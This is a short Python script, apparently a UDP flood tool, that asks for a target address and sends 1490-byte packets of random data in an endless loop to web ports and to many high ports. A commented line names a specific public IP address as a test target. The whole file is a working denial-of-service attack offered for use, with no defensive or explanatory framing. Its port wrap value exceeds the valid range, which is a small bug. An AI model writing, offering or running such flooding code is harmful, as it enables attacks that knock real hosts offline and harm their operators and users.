import socket
import random

site=input('entrer votre input')    
##site='184.183.25.203' ## using this ip for testing
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
port=0

class Hack :
    def __init__(self,site,port):         
        self.site=site
        self.port=port
    def hacking(self) :
        if (self.port==80) or (self.port==443) :
            print(self.port)
            sock.sendto(bytes, (self.site,self.port))
        elif (self.port >= 1024) and (self.port%4==0) :
            print (self.port)
            sock.sendto(bytes, (self.site,self.port))
        else :
            pass
        
    

while True :
    Hack_obj=Hack(site,port)
    Hack_obj.hacking()
    port+=1
    if port ==655534:
        port=1